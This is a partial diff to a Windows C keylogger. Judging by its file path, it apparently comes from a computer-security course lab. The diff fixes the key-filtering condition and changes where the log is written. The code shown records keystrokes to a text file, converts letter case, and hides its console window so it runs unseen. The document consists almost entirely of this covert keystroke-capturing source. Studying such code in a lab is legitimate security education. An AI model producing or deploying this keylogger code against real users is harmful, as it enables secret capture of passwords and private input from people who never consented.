@@ -4,11 +4,11 @@
 FILE *file;
 
 void logkeystroke(int key) {
-    if (key == VK_SHIFT  key == VK_CONTROL  key == VK_MENU) {
+    if (key == VK_SHIFT || key == VK_CONTROL || key == VK_MENU) {
         return;
     }
 
-    file = fopen("C:\\Users\\PC\\Documents\\C programms\\keyloggerTestl\\keylog.txt", "a+");
+    file = fopen("C:\\Users\\RALVA\\Desktop\\Computer security\\Tps\\Tp1\\keylogger_Test\\keylog.txt", "a+");
 
     if ((key >= 65 && key <= 90) && !(GetAsyncKeyState(VK_SHIFT))) {
         key += 32;
@@ -17,7 +17,6 @@ void logkeystroke(int key) {
     fputc(key, file);
     fclose(file);
 }
-
 int main() {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
